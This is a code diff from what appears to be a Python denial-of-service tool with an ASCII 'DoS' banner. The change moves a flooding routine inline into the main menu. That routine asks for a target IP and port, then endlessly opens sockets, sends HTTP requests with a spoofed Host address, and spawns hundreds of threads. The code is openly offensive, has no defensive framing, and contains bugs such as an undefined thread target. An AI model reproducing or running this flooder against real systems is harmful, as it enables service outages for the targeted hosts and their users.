@@ -8,24 +8,6 @@ import time
 from scapy.all import *
 fake_ip = '44.197.175.168'
 attack_num = 0
-def Attack(target, port):
-    target = str(input("Target IP: "))
-    port = int(input("Target Port (80 suggested): "))
-    while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target, port))
-        s.sendto(("GET /" + target +"HTTP/1.1\r\n").encode('ascii'), (target, port))
-        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-
-        global attack_num
-        attack_num += 1
-        print(attack_num)
-
-        s.close()
-        for i in range(500):
-            thread = threading.Thread(target = attack)
-            thread.start()
-            Attack(target, port)
 
 def randomIP():
 	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
@@ -124,7 +106,22 @@ def main():
         print("  / /_____/ / / / __ \\__ \ ")
         print(" / /_____/ /_/ / /_/ /__/ / ")
         print("/_/     /_____/\____/____/  ")
-        Attack()
+        target = str(input("Target IP: "))
+        port = int(input("Target Port (80 suggested): "))
+        while True:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target, port))
+            s.sendto(("GET /" + target +"HTTP/1.1\r\n").encode('ascii'), (target, port))
+            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+            
+            global attack_num
+            attack_num += 1
+            print(attack_num)
+            
+            s.close()
+            for i in range(500):
+                thread = threading.Thread(target = attack)
+                thread.start()
     elif option == 3:
         os.system("clear")
         print("  ______    ____       _____")
